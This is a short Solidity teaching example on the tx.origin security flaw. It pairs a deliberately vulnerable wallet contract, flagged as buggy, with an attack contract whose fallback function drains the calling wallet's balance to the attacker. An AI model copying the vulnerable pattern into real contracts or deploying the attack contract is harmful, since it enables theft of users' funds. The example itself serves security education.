//This is an example for tx.orgin seruity issue
//TxUserWallet:

pragma solidity ^0.4.11;
// THIS CONTRACT CONTAINS A BUG - DO NOT USE
contract TxUserWallet {
    address owner;
    function TxUserWallet() public {
        owner = msg.sender;
}
    function transferTo(address dest, uint amount) public {
        require(tx.origin == owner);
        dest.transfer(amount);
} }


//HackerWallet
// someone tricks you into sending ether to the address of this a ack wallet:
pragma solidity ^0.4.11;
interface TxUserWallet {
    function transferTo(address dest, uint amount) public;
}
contract TxAttackWallet {
    address owner;
    function TxAttackWallet() public {
        owner = msg.sender;
}
    function() public {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
} }
